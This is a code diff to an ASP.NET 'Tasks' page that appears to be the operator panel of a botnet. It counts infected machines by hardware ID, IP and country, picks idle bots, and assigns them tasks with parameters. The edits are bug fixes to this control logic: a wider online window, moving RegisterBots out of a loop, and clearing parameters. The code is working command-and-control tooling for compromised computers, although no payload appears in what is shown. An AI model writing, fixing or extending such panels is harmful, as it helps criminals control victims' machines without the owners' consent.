@@ -35,7 +35,7 @@ public partial class Tasks : System.Web.UI.Page
                 lblTotalBots.Text = connTotal.ToString();
             }
 
-            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE())));", conn))
+            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())));", conn))
             {
                 onnlineNow = (int)cmd.ExecuteScalar();
                 lblOnnlineNow.Text = onnlineNow.ToString();
@@ -104,7 +104,7 @@ public partial class Tasks : System.Web.UI.Page
 
             if (where != null && where != "")
             {
-                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where Active =  @False AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where", conn))
+                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where Active =  @False AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where", conn))
                 {
                     cmd.Parameters.AddWithValue("False", "False");
                     cmd.Parameters.AddWithValue("Where", where);
@@ -118,15 +118,17 @@ public partial class Tasks : System.Web.UI.Page
 
                     for (int i = 1; i <= amount; i++)
                     {
-                        using (SqlCommand cmd = new SqlCommand("select HWID from (select HWID, DENSE_RANK() over (order by HWID) as rownum from bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where group by HWID) as tbl where tbl.rownum = @i ", conn))
+                        using (SqlCommand cmd = new SqlCommand("select HWID from (select HWID, DENSE_RANK() over (order by HWID) as rownum from bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where group by HWID) as tbl where tbl.rownum = @i ", conn))
                         {
                             cmd.Parameters.AddWithValue("False", "False");
                             cmd.Parameters.AddWithValue("Where", where);
                             cmd.Parameters.AddWithValue("i", i);
+
                             Bots[i] = (string)cmd.ExecuteScalar();
-                            RegisterBots();
+                            cmd.Parameters.Clear();
                         }
                     }
+                    RegisterBots();
                 }
                 else if (Available == 0)
                 {
@@ -139,7 +141,7 @@ public partial class Tasks : System.Web.UI.Page
             }
             else
             {
-                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE())))", conn))
+                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())))", conn))
                 {
                     cmd.Parameters.AddWithValue("False", "False");
 
@@ -152,14 +154,16 @@ public partial class Tasks : System.Web.UI.Page
 
                     for (int i = 1; i <= amount; i++)
                     {
-                        using (SqlCommand cmd = new SqlCommand("select HWID from (select HWID, DENSE_RANK() over (order by HWID) as rownum from bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE()))) group by HWID) as tbl where tbl.rownum = @i", conn))
+                        using (SqlCommand cmd = new SqlCommand("select HWID from (select HWID, DENSE_RANK() over (order by HWID) as rownum from bots where Active = @False AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) group by HWID) as tbl where tbl.rownum = @i", conn))
                         {
                             cmd.Parameters.AddWithValue("False", "False");
                             cmd.Parameters.AddWithValue("i", i);
+
                             Bots[i] = (string)cmd.ExecuteScalar();
-                            RegisterBots();
+                            cmd.Parameters.Clear();
                         }
                     }
+                    RegisterBots();
                 }
                 else
                 {
@@ -192,6 +196,7 @@ public partial class Tasks : System.Web.UI.Page
                     cmd.Parameters.AddWithValue("HWID", Bots[i]);
 
                     cmd.ExecuteNonQuery();
+                    cmd.Parameters.Clear();
                 }
             }
             using (SqlCommand cmd = new SqlCommand("UPDATE Bots SET Active=@True WHERE HWID = @HWID", conn))
@@ -202,6 +207,7 @@ public partial class Tasks : System.Web.UI.Page
                     cmd.Parameters.AddWithValue("HWID", Bots[i]);
 
                     cmd.ExecuteNonQuery();
+                    cmd.Parameters.Clear();
                 }
             }
             Response.Redirect(Request.RawUrl);
@@ -232,8 +238,9 @@ public partial class Tasks : System.Web.UI.Page
                     cmd.Parameters.AddWithValue("TaskID", TaskID);
                     cmd.Parameters.AddWithValue("i", i);
                     BotHWID[i] = (string)cmd.ExecuteScalar();
+                    cmd.Parameters.Clear();
                 }
-                using (SqlCommand cmd = new SqlCommand("UPDATE Bots SET Active=@False WHERE HWID = @HWID", Conn))
+                using (SqlCommand cmd = new SqlCommand("UPDATE Bots SET Active=@False WHERE HWID = @HWID ", Conn))
                 {
                     cmd.Parameters.AddWithValue("False", "False");
                     cmd.Parameters.AddWithValue("HWID", BotHWID[i]);
@@ -300,7 +307,7 @@ public partial class Tasks : System.Web.UI.Page
         using (SqlConnection Conn = new SqlConnection(Settings.sqlConn))
         {
             Conn.Open();
-            using (SqlCommand cmd = new SqlCommand("select TaskID, Type, Parameter1, Parameter2, Parameter3, Parameter4, Max, Ran, Filter, Status from Tasks where Status = @Enabled", Conn))
+            using (SqlCommand cmd = new SqlCommand("select distinct TaskID, Type, Parameter1, Parameter2, Parameter3, Parameter4, Max, Ran, Filter, Status from Tasks where Status = @Enabled", Conn))
             {
                 cmd.Parameters.AddWithValue("Enabled", "Enabled");
                 DataSet ds = new DataSet();
